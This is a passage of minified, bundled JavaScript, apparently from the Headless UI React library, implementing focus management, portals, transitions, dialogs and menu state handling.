    function Qf(e, t) {
        let n = t.resolveItems();
        if (n.length <= 0) return null;
        let r = t.resolveActiveIndex(),
            i = r ?? -1;
        switch (e.focus) {
            case 0:
                {
                    for (let o = 0; o < n.length; ++o)
                        if (!t.resolveDisabled(n[o], o, n)) return o;
                    return r
                }
            case 1:
                {
                    i === -1 && (i = n.length);
                    for (let o = i - 1; o >= 0; --o)
                        if (!t.resolveDisabled(n[o], o, n)) return o;
                    return r
                }
            case 2:
                {
                    for (let o = i + 1; o < n.length; ++o)
                        if (!t.resolveDisabled(n[o], o, n)) return o;
                    return r
                }
            case 3:
                {
                    for (let o = n.length - 1; o >= 0; --o)
                        if (!t.resolveDisabled(n[o], o, n)) return o;
                    return r
                }
            case 4:
                {
                    for (let o = 0; o < n.length; ++o)
                        if (t.resolveId(n[o], o, n) === e.id) return o;
                    return r
                }
            case 5:
                return null;
            default:
                $I(e)
        }
    }

    function gx(e) {
        let t = J(e),
            n = b.useRef(!1);
        b.useEffect(() => (n.current = !1, () => {
            n.current = !0, Ol(() => {
                n.current && t()
            })
        }), [t])
    }

    function UI() {
        let e = typeof document > "u";
        return "useSyncExternalStore" in mh ? (t => t.useSyncExternalStore)(mh)(() => () => {}, () => !1, () => !e) : !1
    }

    function jl() {
        let e = UI(),
            [t, n] = b.useState(zi.isHandoffComplete);
        return t && zi.isHandoffComplete === !1 && n(!1), b.useEffect(() => {
            t !== !0 && n(!0)
        }, [t]), b.useEffect(() => zi.handoff(), []), e ? !1 : t
    }
    let vx = b.createContext(!1);

    function zI() {
        return b.useContext(vx)
    }

    function Xv(e) {
        return q.createElement(vx.Provider, {
            value: e.force
        }, e.children)
    }

    function GI(e) {
        let t = zI(),
            n = b.useContext(wx),
            r = Ls(e),
            [i, o] = b.useState(() => {
                var s;
                if (!t && n !== null) return (s = n.current) != null ? s : null;
                if (zi.isServer) return null;
                let a = r == null ? void 0 : r.getElementById("headlessui-portal-root");
                if (a) return a;
                if (r === null) return null;
                let l = r.createElement("div");
                return l.setAttribute("id", "headlessui-portal-root"), r.body.appendChild(l)
            });
        return b.useEffect(() => {
            i !== null && (r != null && r.body.contains(i) || r == null || r.body.appendChild(i))
        }, [i, r]), b.useEffect(() => {
            t || n !== null && o(n.current)
        }, [n, o, t]), i
    }
    let yx = b.Fragment,
        VI = _e(function(e, t) {
            let n = e,
                r = b.useRef(null),
                i = We(zk(d => {
                    r.current = d
                }), t),
                o = Ls(r),
                s = GI(r),
                [a] = b.useState(() => {
                    var d;
                    return zi.isServer ? null : (d = o == null ? void 0 : o.createElement("div")) != null ? d : null
                }),
                l = b.useContext(yp),
                u = jl();
            ve(() => {
                !s || !a || s.contains(a) || (a.setAttribute("data-headlessui-portal", ""), s.appendChild(a))
            }, [s, a]), ve(() => {
                if (a && l) return l.register(a)
            }, [l, a]), gx(() => {
                var d;
                !s || !a || (a instanceof Node && s.contains(a) && s.removeChild(a), s.childNodes.length <= 0 && ((d = s.parentElement) == null || d.removeChild(s)))
            });
            let c = Pe();
            return u ? !s || !a ? null : Sn.createPortal(c({
                ourProps: {
                    ref: i
                },
                theirProps: n,
                slot: {},
                defaultTag: yx,
                name: "Portal"
            }), a) : null
        });

    function WI(e, t) {
        let n = We(t),
            {
                enabled: r = !0,
                ...i
            } = e,
            o = Pe();
        return r ? q.createElement(VI, { ...i,
            ref: n
        }) : o({
            ourProps: {
                ref: n
            },
            theirProps: i,
            slot: {},
            defaultTag: yx,
            name: "Portal"
        })
    }
    let qI = b.Fragment,
        wx = b.createContext(null);

    function QI(e, t) {
        let {
            target: n,
            ...r
        } = e, i = {
            ref: We(t)
        }, o = Pe();
        return q.createElement(wx.Provider, {
            value: n
        }, o({
            ourProps: i,
            theirProps: r,
            defaultTag: qI,
            name: "Popover.Group"
        }))
    }
    let yp = b.createContext(null);

    function KI() {
        let e = b.useContext(yp),
            t = b.useRef([]),
            n = J(o => (t.current.push(o), e && e.register(o), () => r(o))),
            r = J(o => {
                let s = t.current.indexOf(o);
                s !== -1 && t.current.splice(s, 1), e && e.unregister(o)
            }),
            i = b.useMemo(() => ({
                register: n,
                unregister: r,
                portals: t
            }), [n, r, t]);
        return [t, b.useMemo(() => function({
            children: o
        }) {
            return q.createElement(yp.Provider, {
                value: i
            }, o)
        }, [i])]
    }
    let ZI = _e(WI),
        bx = _e(QI),
        xx = Object.assign(ZI, {
            Group: bx
        });

    function YI(e, t = typeof document < "u" ? document.defaultView : null, n) {
        let r = Os(e, "escape");
        Kb(t, "keydown", i => {
            r && (i.defaultPrevented || i.key === Ee.Escape && n(i))
        })
    }

    function JI() {
        var e;
        let [t] = b.useState(() => typeof window < "u" && typeof window.matchMedia == "function" ? window.matchMedia("(pointer: coarse)") : null), [n, r] = b.useState((e = t == null ? void 0 : t.matches) != null ? e : !1);
        return ve(() => {
            if (!t) return;

            function i(o) {
                r(o.matches)
            }
            return t.addEventListener("change", i), () => t.removeEventListener("change", i)
        }, [t]), n
    }

    function XI({
        defaultContainers: e = [],
        portals: t,
        mainTreeNode: n
    } = {}) {
        let r = Ls(n),
            i = J(() => {
                var o, s;
                let a = [];
                for (let l of e) l !== null && (l instanceof HTMLElement ? a.push(l) : "current" in l && l.current instanceof HTMLElement && a.push(l.current));
                if (t != null && t.current)
                    for (let l of t.current) a.push(l);
                for (let l of (o = r == null ? void 0 : r.querySelectorAll("html > *, body > *")) != null ? o : []) l !== document.body && l !== document.head && l instanceof HTMLElement && l.id !== "headlessui-portal-root" && (n && (l.contains(n) || l.contains((s = n == null ? void 0 : n.getRootNode()) == null ? void 0 : s.host)) || a.some(u => l.contains(u)) || a.push(l));
                return a
            });
        return {
            resolveContainers: i,
            contains: J(o => i().some(s => s.contains(o)))
        }
    }
    let Ex = b.createContext(null);

    function ey({
        children: e,
        node: t
    }) {
        let [n, r] = b.useState(null), i = Ax(t ?? n);
        return q.createElement(Ex.Provider, {
            value: i
        }, e, i === null && q.createElement(Ja, {
            features: Ya.Hidden,
            ref: o => {
                var s, a;
                if (o) {
                    for (let l of (a = (s = mi(o)) == null ? void 0 : s.querySelectorAll("html > *, body > *")) != null ? a : [])
                        if (l !== document.body && l !== document.head && l instanceof HTMLElement && l != null && l.contains(o)) {
                            r(l);
                            break
                        }
                }
            }
        }))
    }

    function Ax(e = null) {
        var t;
        return (t = b.useContext(Ex)) != null ? t : e
    }

    function Od() {
        let e = b.useRef(!1);
        return ve(() => (e.current = !0, () => {
            e.current = !1
        }), []), e
    }
    var da = (e => (e[e.Forwards = 0] = "Forwards", e[e.Backwards = 1] = "Backwards", e))(da || {});

    function e3() {
        let e = b.useRef(0);
        return qb(!0, "keydown", t => {
            t.key === "Tab" && (e.current = t.shiftKey ? 1 : 0)
        }, !0), e
    }

    function _x(e) {
        if (!e) return new Set;
        if (typeof e == "function") return new Set(e());
        let t = new Set;
        for (let n of e.current) n.current instanceof HTMLElement && t.add(n.current);
        return t
    }
    let t3 = "div";
    var ki = (e => (e[e.None = 0] = "None", e[e.InitialFocus = 1] = "InitialFocus", e[e.TabLock = 2] = "TabLock", e[e.FocusLock = 4] = "FocusLock", e[e.RestoreFocus = 8] = "RestoreFocus", e[e.AutoFocus = 16] = "AutoFocus", e))(ki || {});

    function n3(e, t) {
        let n = b.useRef(null),
            r = We(n, t),
            {
                initialFocus: i,
                initialFocusFallback: o,
                containers: s,
                features: a = 15,
                ...l
            } = e;
        jl() || (a = 0);
        let u = Ls(n);
        s3(a, {
            ownerDocument: u
        });
        let c = a3(a, {
            ownerDocument: u,
            container: n,
            initialFocus: i,
            initialFocusFallback: o
        });
        l3(a, {
            ownerDocument: u,
            container: n,
            containers: s,
            previousActiveElement: c
        });
        let d = e3(),
            f = J(g => {
                let y = n.current;
                y && (x => x())(() => {
                    Et(d.current, {
                        [da.Forwards]: () => {
                            ln(y, He.First, {
                                skipElements: [g.relatedTarget, o]
                            })
                        },
                        [da.Backwards]: () => {
                            ln(y, He.Last, {
                                skipElements: [g.relatedTarget, o]
                            })
                        }
                    })
                })
            }),
            h = Os(!!(a & 2), "focus-trap#tab-lock"),
            v = Ms(),
            p = b.useRef(!1),
            w = {
                ref: r,
                onKeyDown(g) {
                    g.key == "Tab" && (p.current = !0, v.requestAnimationFrame(() => {
                        p.current = !1
                    }))
                },
                onBlur(g) {
                    if (!(a & 4)) return;
                    let y = _x(s);
                    n.current instanceof HTMLElement && y.add(n.current);
                    let x = g.relatedTarget;
                    x instanceof HTMLElement && x.dataset.headlessuiFocusGuard !== "true" && (Sx(y, x) || (p.current ? ln(n.current, Et(d.current, {
                        [da.Forwards]: () => He.Next,
                        [da.Backwards]: () => He.Previous
                    }) | He.WrapAround, {
                        relativeTo: g.target
                    }) : g.target instanceof HTMLElement && Gn(g.target)))
                }
            },
            m = Pe();
        return q.createElement(q.Fragment, null, h && q.createElement(Ja, {
            as: "button",
            type: "button",
            "data-headlessui-focus-guard": !0,
            onFocus: f,
            features: Ya.Focusable
        }), m({
            ourProps: w,
            theirProps: l,
            defaultTag: t3,
            name: "FocusTrap"
        }), h && q.createElement(Ja, {
            as: "button",
            type: "button",
            "data-headlessui-focus-guard": !0,
            onFocus: f,
            features: Ya.Focusable
        }))
    }
    let r3 = _e(n3),
        i3 = Object.assign(r3, {
            features: ki
        });

    function o3(e = !0) {
        let t = b.useRef(jr.slice());
        return s0(([n], [r]) => {
            r === !0 && n === !1 && Ol(() => {
                t.current.splice(0)
            }), r === !1 && n === !0 && (t.current = jr.slice())
        }, [e, jr, t]), J(() => {
            var n;
            return (n = t.current.find(r => r != null && r.isConnected)) != null ? n : null
        })
    }

    function s3(e, {
        ownerDocument: t
    }) {
        let n = !!(e & 8),
            r = o3(n);
        s0(() => {
            n || (t == null ? void 0 : t.activeElement) === (t == null ? void 0 : t.body) && Gn(r())
        }, [n]), gx(() => {
            n && Gn(r())
        })
    }

    function a3(e, {
        ownerDocument: t,
        container: n,
        initialFocus: r,
        initialFocusFallback: i
    }) {
        let o = b.useRef(null),
            s = Os(!!(e & 1), "focus-trap#initial-focus"),
            a = Od();
        return s0(() => {
            if (e === 0) return;
            if (!s) {
                i != null && i.current && Gn(i.current);
                return
            }
            let l = n.current;
            l && Ol(() => {
                if (!a.current) return;
                let u = t == null ? void 0 : t.activeElement;
                if (r != null && r.current) {
                    if ((r == null ? void 0 : r.current) === u) {
                        o.current = u;
                        return
                    }
                } else if (l.contains(u)) {
                    o.current = u;
                    return
                }
                if (r != null && r.current) Gn(r.current);
                else {
                    if (e & 16) {
                        if (ln(l, He.First | He.AutoFocus) !== Bi.Error) return
                    } else if (ln(l, He.First) !== Bi.Error) return;
                    if (i != null && i.current && (Gn(i.current), (t == null ? void 0 : t.activeElement) === i.current)) return;
                    console.warn("There are no focusable elements inside the <FocusTrap />")
                }
                o.current = t == null ? void 0 : t.activeElement
            })
        }, [i, s, e]), o
    }

    function l3(e, {
        ownerDocument: t,
        container: n,
        containers: r,
        previousActiveElement: i
    }) {
        let o = Od(),
            s = !!(e & 4);
        Kb(t == null ? void 0 : t.defaultView, "focus", a => {
            if (!s || !o.current) return;
            let l = _x(r);
            n.current instanceof HTMLElement && l.add(n.current);
            let u = i.current;
            if (!u) return;
            let c = a.target;
            c && c instanceof HTMLElement ? Sx(l, c) ? (i.current = c, Gn(c)) : (a.preventDefault(), a.stopPropagation(), Gn(u)) : Gn(i.current)
        }, !0)
    }

    function Sx(e, t) {
        for (let n of e)
            if (n.contains(t)) return !0;
        return !1
    }

    function kx(e) {
        var t;
        return !!(e.enter || e.enterFrom || e.enterTo || e.leave || e.leaveFrom || e.leaveTo) || ((t = e.as) != null ? t : Ix) !== b.Fragment || q.Children.count(e.children) === 1
    }
    let Ld = b.createContext(null);
    Ld.displayName = "TransitionContext";
    var c3 = (e => (e.Visible = "visible", e.Hidden = "hidden", e))(c3 || {});

    function u3() {
        let e = b.useContext(Ld);
        if (e === null) throw new Error("A <Transition.Child /> is used but it is missing a parent <Transition /> or <Transition.Root />.");
        return e
    }

    function d3() {
        let e = b.useContext(Fd);
        if (e === null) throw new Error("A <Transition.Child /> is used but it is missing a parent <Transition /> or <Transition.Root />.");
        return e
    }
    let Fd = b.createContext(null);
    Fd.displayName = "NestingContext";

    function Dd(e) {
        return "children" in e ? Dd(e.children) : e.current.filter(({
            el: t
        }) => t.current !== null).filter(({
            state: t
        }) => t === "visible").length > 0
    }

    function Tx(e, t) {
        let n = xn(e),
            r = b.useRef([]),
            i = Od(),
            o = Ms(),
            s = J((h, v = zr.Hidden) => {
                let p = r.current.findIndex(({
                    el: w
                }) => w === h);
                p !== -1 && (Et(v, {
                    [zr.Unmount]() {
                        r.current.splice(p, 1)
                    },
                    [zr.Hidden]() {
                        r.current[p].state = "hidden"
                    }
                }), o.microTask(() => {
                    var w;
                    !Dd(r) && i.current && ((w = n.current) == null || w.call(n))
                }))
            }),
            a = J(h => {
                let v = r.current.find(({
                    el: p
                }) => p === h);
                return v ? v.state !== "visible" && (v.state = "visible") : r.current.push({
                    el: h,
                    state: "visible"
                }), () => s(h, zr.Unmount)
            }),
            l = b.useRef([]),
            u = b.useRef(Promise.resolve()),
            c = b.useRef({
                enter: [],
                leave: []
            }),
            d = J((h, v, p) => {
                l.current.splice(0), t && (t.chains.current[v] = t.chains.current[v].filter(([w]) => w !== h)), t == null || t.chains.current[v].push([h, new Promise(w => {
                    l.current.push(w)
                })]), t == null || t.chains.current[v].push([h, new Promise(w => {
                    Promise.all(c.current[v].map(([m, g]) => g)).then(() => w())
                })]), v === "enter" ? u.current = u.current.then(() => t == null ? void 0 : t.wait.current).then(() => p(v)) : p(v)
            }),
            f = J((h, v, p) => {
                Promise.all(c.current[v].splice(0).map(([w, m]) => m)).then(() => {
                    var w;
                    (w = l.current.shift()) == null || w()
                }).then(() => p(v))
            });
        return b.useMemo(() => ({
            children: r,
            register: a,
            unregister: s,
            onStart: d,
            onStop: f,
            wait: u,
            chains: c
        }), [a, s, r, d, f, c, u])
    }
    let Ix = b.Fragment,
        Cx = ii.RenderStrategy;

    function f3(e, t) {
        var n, r;
        let {
            transition: i = !0,
            beforeEnter: o,
            afterEnter: s,
            beforeLeave: a,
            afterLeave: l,
            enter: u,
            enterFrom: c,
            enterTo: d,
            entered: f,
            leave: h,
            leaveFrom: v,
            leaveTo: p,
            ...w
        } = e, [m, g] = b.useState(null), y = b.useRef(null), x = kx(e), E = We(...x ? [y, t, g] : t === null ? [] : [t]), k = (n = w.unmount) == null || n ? zr.Unmount : zr.Hidden, {
            show: I,
            appear: _,
            initial: L
        } = u3(), [C, M] = b.useState(I ? "visible" : "hidden"), F = d3(), {
            register: U,
            unregister: Q
        } = F;
        ve(() => U(y), [U, y]), ve(() => {
            if (k === zr.Hidden && y.current) {
                if (I && C !== "visible") {
                    M("visible");
                    return
                }
                return Et(C, {
                    hidden: () => Q(y),
                    visible: () => U(y)
                })
            }
        }, [C, y, U, Q, I, k]);
        let A = jl();
        ve(() => {
            if (x && A && C === "visible" && y.current === null) throw new Error("Did you forget to passthrough the `ref` to the actual DOM node?")
        }, [y, C, A, x]);
        let P = L && !_,
            O = _ && I && L,
            T = b.useRef(!1),
            B = Tx(() => {
                T.current || (M("hidden"), Q(y))
            }, F),
            R = J(nt => {
                T.current = !0;
                let Rr = nt ? "enter" : "leave";
                B.onStart(y, Rr, $t => {
                    $t === "enter" ? o == null || o() : $t === "leave" && (a == null || a())
                })
            }),
            $ = J(nt => {
                let Rr = nt ? "enter" : "leave";
                T.current = !1, B.onStop(y, Rr, $t => {
                    $t === "enter" ? s == null || s() : $t === "leave" && (l == null || l())
                }), Rr === "leave" && !Dd(B) && (M("hidden"), Q(y))
            });
        b.useEffect(() => {
            x && i || (R(I), $(I))
        }, [I, x, i]);
        let Z = !(!i || !x || !A || P),
            [, ie] = Xb(Z, m, I, {
                start: R,
                end: $
            }),
            be = _i({
                ref: E,
                className: ((r = hp(w.className, O && u, O && c, ie.enter && u, ie.enter && ie.closed && c, ie.enter && !ie.closed && d, ie.leave && h, ie.leave && !ie.closed && v, ie.leave && ie.closed && p, !ie.transition && I && f)) == null ? void 0 : r.trim()) || void 0,
                ...Jb(ie)
            }),
            ze = 0;
        C === "visible" && (ze |= wt.Open), C === "hidden" && (ze |= wt.Closed), ie.enter && (ze |= wt.Opening), ie.leave && (ze |= wt.Closing);
        let gt = Pe();
        return q.createElement(Fd.Provider, {
            value: B
        }, q.createElement(mx, {
            value: ze
        }, gt({
            ourProps: be,
            theirProps: w,
            defaultTag: Ix,
            features: Cx,
            visible: C === "visible",
            name: "Transition.Child"
        })))
    }

    function h3(e, t) {
        let {
            show: n,
            appear: r = !1,
            unmount: i = !0,
            ...o
        } = e, s = b.useRef(null), a = kx(e), l = We(...a ? [s, t] : t === null ? [] : [t]);
        jl();
        let u = Dl();
        if (n === void 0 && u !== null && (n = (u & wt.Open) === wt.Open), n === void 0) throw new Error("A <Transition /> is used but it is missing a `show={true | false}` prop.");
        let [c, d] = b.useState(n ? "visible" : "hidden"), f = Tx(() => {
            n || d("hidden")
        }), [h, v] = b.useState(!0), p = b.useRef([n]);
        ve(() => {
            h !== !1 && p.current[p.current.length - 1] !== n && (p.current.push(n), v(!1))
        }, [p, n]);
        let w = b.useMemo(() => ({
            show: n,
            appear: r,
            initial: h
        }), [n, r, h]);
        ve(() => {
            n ? d("visible") : !Dd(f) && s.current !== null && d("hidden")
        }, [n, f]);
        let m = {
                unmount: i
            },
            g = J(() => {
                var E;
                h && v(!1), (E = e.beforeEnter) == null || E.call(e)
            }),
            y = J(() => {
                var E;
                h && v(!1), (E = e.beforeLeave) == null || E.call(e)
            }),
            x = Pe();
        return q.createElement(Fd.Provider, {
            value: f
        }, q.createElement(Ld.Provider, {
            value: w
        }, x({
            ourProps: { ...m,
                as: b.Fragment,
                children: q.createElement(Px, {
                    ref: l,
                    ...m,
                    ...o,
                    beforeEnter: g,
                    beforeLeave: y
                })
            },
            theirProps: {},
            defaultTag: b.Fragment,
            features: Cx,
            visible: c === "visible",
            name: "Transition"
        })))
    }

    function p3(e, t) {
        let n = b.useContext(Ld) !== null,
            r = Dl() !== null;
        return q.createElement(q.Fragment, null, !n && r ? q.createElement(wp, {
            ref: t,
            ...e
        }) : q.createElement(Px, {
            ref: t,
            ...e
        }))
    }
    let wp = _e(h3),
        Px = _e(f3),
        f0 = _e(p3),
        ot = Object.assign(wp, {
            Child: f0,
            Root: wp
        });
    var m3 = (e => (e[e.Open = 0] = "Open", e[e.Closed = 1] = "Closed", e))(m3 || {}),
        g3 = (e => (e[e.SetTitleId = 0] = "SetTitleId", e))(g3 || {});
    let v3 = {
            0(e, t) {
                return e.titleId === t.id ? e : { ...e,
                    titleId: t.id
                }
            }
        },
        h0 = b.createContext(null);
    h0.displayName = "DialogContext";

    function jd(e) {
        let t = b.useContext(h0);
        if (t === null) {
            let n = new Error(`<${e} /> is missing a parent <Dialog /> component.`);
            throw Error.captureStackTrace && Error.captureStackTrace(n, jd), n
        }
        return t
    }

    function y3(e, t) {
        return Et(t.type, v3, e, t)
    }
    let ty = _e(function(e, t) {
            let n = b.useId(),
                {
                    id: r = `headlessui-dialog-${n}`,
                    open: i,
                    onClose: o,
                    initialFocus: s,
                    role: a = "dialog",
                    autoFocus: l = !0,
                    __demoMode: u = !1,
                    unmount: c = !1,
                    ...d
                } = e,
                f = b.useRef(!1);
            a = function() {
                return a === "dialog" || a === "alertdialog" ? a : (f.current || (f.current = !0, console.warn(`Invalid role [${a}] passed to <Dialog />. Only \`dialog\` and and \`alertdialog\` are supported. Using \`dialog\` instead.`)), "dialog")
            }();
            let h = Dl();
            i === void 0 && h !== null && (i = (h & wt.Open) === wt.Open);
            let v = b.useRef(null),
                p = We(v, t),
                w = Ls(v),
                m = i ? 0 : 1,
                [g, y] = b.useReducer(y3, {
                    titleId: null,
                    descriptionId: null,
                    panelRef: b.createRef()
                }),
                x = J(() => o(!1)),
                E = J($ => y({
                    type: 0,
                    id: $
                })),
                k = jl() ? m === 0 : !1,
                [I, _] = KI(),
                L = {
                    get current() {
                        var $;
                        return ($ = g.panelRef.current) != null ? $ : v.current
                    }
                },
                C = Ax(),
                {
                    resolveContainers: M
                } = XI({
                    mainTreeNode: C,
                    portals: I,
                    defaultContainers: [L]
                }),
                F = h !== null ? (h & wt.Closing) === wt.Closing : !1;
            Ub(u || F ? !1 : k, {
                allowed: J(() => {
                    var $, Z;
                    return [(Z = ($ = v.current) == null ? void 0 : $.closest("[data-headlessui-portal]")) != null ? Z : null]
                }),
                disallowed: J(() => {
                    var $;
                    return [($ = C == null ? void 0 : C.closest("body > *:not(#headlessui-portal-root)")) != null ? $ : null]
                })
            }), Qb(k, M, $ => {
                $.preventDefault(), x()
            }), YI(k, w == null ? void 0 : w.defaultView, $ => {
                $.preventDefault(), $.stopPropagation(), document.activeElement && "blur" in document.activeElement && typeof document.activeElement.blur == "function" && document.activeElement.blur(), x()
            }), Yb(u || F ? !1 : k, w, M), zb(k, v, x);
            let [U, Q] = Db(), A = b.useMemo(() => [{
                dialogState: m,
                close: x,
                setTitleId: E,
                unmount: c
            }, g], [m, g, x, E, c]), P = b.useMemo(() => ({
                open: m === 0
            }), [m]), O = {
                ref: p,
                id: r,
                role: a,
                tabIndex: -1,
                "aria-modal": u ? void 0 : m === 0 ? !0 : void 0,
                "aria-labelledby": g.titleId,
                "aria-describedby": U,
                unmount: c
            }, T = !JI(), B = ki.None;
            k && !u && (B |= ki.RestoreFocus, B |= ki.TabLock, l && (B |= ki.AutoFocus), T && (B |= ki.InitialFocus));
            let R = Pe();
            return q.createElement(jI, null, q.createElement(Xv, {
                force: !0
            }, q.createElement(xx, null, q.createElement(h0.Provider, {
                value: A
            }, q.createElement(bx, {
                target: v
            }, q.createElement(Xv, {
                force: !1
            }, q.createElement(Q, {
                slot: P
            }, q.createElement(_, null, q.createElement(i3, {
                initialFocus: s,
                initialFocusFallback: v,
                containers: M,
                features: B
            }, q.createElement(Xk, {
                value: x
            }, R({
                ourProps: O,
                theirProps: d,
                slot: P,
                defaultTag: w3,
                features: b3,
                visible: m === 0,
                name: "Dialog"
            })))))))))))
        }),
        w3 = "div",
        b3 = ii.RenderStrategy | ii.Static;

    function x3(e, t) {
        let {
            transition: n = !1,
            open: r,
            ...i
        } = e, o = Dl(), s = e.hasOwnProperty("open") || o !== null, a = e.hasOwnProperty("onClose");
        if (!s && !a) throw new Error("You have to provide an `open` and an `onClose` prop to the `Dialog` component.");
        if (!s) throw new Error("You provided an `onClose` prop to the `Dialog`, but forgot an `open` prop.");
        if (!a) throw new Error("You provided an `open` prop to the `Dialog`, but forgot an `onClose` prop.");
        if (!o && typeof e.open != "boolean") throw new Error(`You provided an \`open\` prop to the \`Dialog\`, but the value is not a boolean. Received: ${e.open}`);
        if (typeof e.onClose != "function") throw new Error(`You provided an \`onClose\` prop to the \`Dialog\`, but the value is not a function. Received: ${e.onClose}`);
        return (r !== void 0 || n) && !i.static ? q.createElement(ey, null, q.createElement(ot, {
            show: r,
            transition: n,
            unmount: i.unmount
        }, q.createElement(ty, {
            ref: t,
            ...i
        }))) : q.createElement(ey, null, q.createElement(ty, {
            ref: t,
            open: r,
            ...i
        }))
    }
    let E3 = "div";

    function A3(e, t) {
        let n = b.useId(),
            {
                id: r = `headlessui-dialog-panel-${n}`,
                transition: i = !1,
                ...o
            } = e,
            [{
                dialogState: s,
                unmount: a
            }, l] = jd("Dialog.Panel"),
            u = We(t, l.panelRef),
            c = b.useMemo(() => ({
                open: s === 0
            }), [s]),
            d = J(w => {
                w.stopPropagation()
            }),
            f = {
                ref: u,
                id: r,
                onClick: d
            },
            h = i ? f0 : b.Fragment,
            v = i ? {
                unmount: a
            } : {},
            p = Pe();
        return q.createElement(h, { ...v
        }, p({
            ourProps: f,
            theirProps: o,
            slot: c,
            defaultTag: E3,
            name: "Dialog.Panel"
        }))
    }
    let _3 = "div";

    function S3(e, t) {
        let {
            transition: n = !1,
            ...r
        } = e, [{
            dialogState: i,
            unmount: o
        }] = jd("Dialog.Backdrop"), s = b.useMemo(() => ({
            open: i === 0
        }), [i]), a = {
            ref: t,
            "aria-hidden": !0
        }, l = n ? f0 : b.Fragment, u = n ? {
            unmount: o
        } : {}, c = Pe();
        return q.createElement(l, { ...u
        }, c({
            ourProps: a,
            theirProps: r,
            slot: s,
            defaultTag: _3,
            name: "Dialog.Backdrop"
        }))
    }
    let k3 = "h2";

    function T3(e, t) {
        let n = b.useId(),
            {
                id: r = `headlessui-dialog-title-${n}`,
                ...i
            } = e,
            [{
                dialogState: o,
                setTitleId: s
            }] = jd("Dialog.Title"),
            a = We(t);
        b.useEffect(() => (s(r), () => s(null)), [r, s]);
        let l = b.useMemo(() => ({
                open: o === 0
            }), [o]),
            u = {
                ref: a,
                id: r
            };
        return Pe()({
            ourProps: u,
            theirProps: i,
            slot: l,
            defaultTag: k3,
            name: "Dialog.Title"
        })
    }
    let I3 = _e(x3),
        C3 = _e(A3);
    _e(S3);
    let P3 = _e(T3),
        qt = Object.assign(I3, {
            Panel: C3,
            Title: P3,
            Description: qk
        });

    function R3(e, t) {
        let n = b.useRef({
            left: 0,
            top: 0
        });
        if (ve(() => {
                if (!t) return;
                let i = t.getBoundingClientRect();
                i && (n.current = i)
            }, [e, t]), t == null || !e || t === document.activeElement) return !1;
        let r = t.getBoundingClientRect();
        return r.top !== n.current.top || r.left !== n.current.left
    }
    let ny = /([\u2700-\u27BF]|[\uE000-\uF8FF]|\uD83C[\uDC00-\uDFFF]|\uD83D[\uDC00-\uDFFF]|[\u2011-\u26FF]|\uD83E[\uDD10-\uDDFF])/g;

    function ry(e) {
        var t, n;
        let r = (t = e.innerText) != null ? t : "",
            i = e.cloneNode(!0);
        if (!(i instanceof HTMLElement)) return r;
        let o = !1;
        for (let a of i.querySelectorAll('[hidden],[aria-hidden],[role="img"]')) a.remove(), o = !0;
        let s = o ? (n = i.innerText) != null ? n : "" : r;
        return ny.test(s) && (s = s.replace(ny, "")), s
    }

    function N3(e) {
        let t = e.getAttribute("aria-label");
        if (typeof t == "string") return t.trim();
        let n = e.getAttribute("aria-labelledby");
        if (n) {
            let r = n.split(" ").map(i => {
                let o = document.getElementById(i);
                if (o) {
                    let s = o.getAttribute("aria-label");
                    return typeof s == "string" ? s.trim() : ry(o).trim()
                }
                return null
            }).filter(Boolean);
            if (r.length > 0) return r.join(", ")
        }
        return ry(e).trim()
    }

    function B3(e) {
        let t = b.useRef(""),
            n = b.useRef("");
        return J(() => {
            let r = e.current;
            if (!r) return "";
            let i = r.innerText;
            if (t.current === i) return n.current;
            let o = N3(r).trim().toLowerCase();
            return t.current = i, n.current = o, o
        })
    }
    var M3 = (e => (e[e.Open = 0] = "Open", e[e.Closed = 1] = "Closed", e))(M3 || {}),
        O3 = (e => (e[e.Pointer = 0] = "Pointer", e[e.Other = 1] = "Other", e))(O3 || {}),
        L3 = (e => (e[e.OpenMenu = 0] = "OpenMenu", e[e.CloseMenu = 1] = "CloseMenu", e[e.GoToItem = 2] = "GoToItem", e[e.Search = 3] = "Search", e[e.ClearSearch = 4] = "ClearSearch", e[e.RegisterItem = 5] = "RegisterItem", e[e.UnregisterItem = 6] = "UnregisterItem", e[e.SetButtonElement = 7] = "SetButtonElement", e[e.SetItemsElement = 8] = "SetItemsElement", e))(L3 || {});

    function Kf(e, t = n => n) {
        let n = e.activeItemIndex !== null ? e.items[e.activeItemIndex] : null,
            r = Mi(t(e.items.slice()), o => o.dataRef.current.domRef.current),
            i = n ? r.indexOf(n) : null;
        return i === -1 && (i = null), {
            items: r,
            activeItemIndex: i
        }
    }
    let F3 = {
            1(e) {
                return e.menuState === 1 ? e : { ...e,
                    activeItemIndex: null,
                    menuState: 1
                }
            },
            0(e) {
                return e.menuState === 0 ? e : { ...e,
                    __demoMode: !1,
                    menuState: 0
                }
            },
            2: (e, t) => {
                var n, r, i, o, s;
                if (e.menuState === 1) return e;
                let a = { ...e,
                    searchQuery: "",
                    activationTrigger: (n = t.trigger) != null ? n : 1,
                    __demoMode: !1
                };
                if (t.focus === ft.Nothing) return { ...a,
                    activeItemIndex: null
                };
                if (t.focus === ft.Specific) return { ...a,
                    activeItemIndex: e.items.findIndex(c => c.id === t.id)
                };
                if (t.focus === ft.Previous) {
                    let c = e.activeItemIndex;
                    if (c !== null) {
                        let d = e.items[c].dataRef.current.domRef,
                            f = Qf(t, {
                                resolveItems: () => e.items,
                                resolveActiveIndex: () => e.activeItemIndex,
                                resolveId: h => h.id,
                                resolveDisabled: h => h.dataRef.current.disabled
                            });
                        if (f !== null) {
                            let h = e.items[f].dataRef.current.domRef;
                            if (((r = d.current) == null ? void 0 : r.previousElementSibling) === h.current || ((i = h.current) == null ? void 0 : i.previousElementSibling) === null) return { ...a,
                                activeItemIndex: f
                            }
                        }
                    }
                } else if (t.focus === ft.Next) {
                    let c = e.activeItemIndex;
                    if (c !== null) {
                        let d = e.items[c].dataRef.current.domRef,
                            f = Qf(t, {
                                resolveItems: () => e.items,
                                resolveActiveIndex: () => e.activeItemIndex,
                                resolveId: h => h.id,
                                resolveDisabled: h => h.dataRef.current.disabled
                            });
                        if (f !== null) {
                            let h = e.items[f].dataRef.current.domRef;
                            if (((o = d.current) == null ? void 0 : o.nextElementSibling) === h.current || ((s = h.current) == null ? void 0 : s.nextElementSibling) === null) return { ...a,
                                activeItemIndex: f
                            }
                        }
                    }
                }
                let l = Kf(e),
                    u = Qf(t, {
                        resolveItems: () => l.items,
                        resolveActiveIndex: () => l.activeItemIndex,
                        resolveId: c => c.id,
                        resolveDisabled: c => c.dataRef.current.disabled
                    });
                return { ...a,
                    ...l,
                    activeItemIndex: u
                }
            },
            3: (e, t) => {
                let n = e.searchQuery !== "" ? 0 : 1,
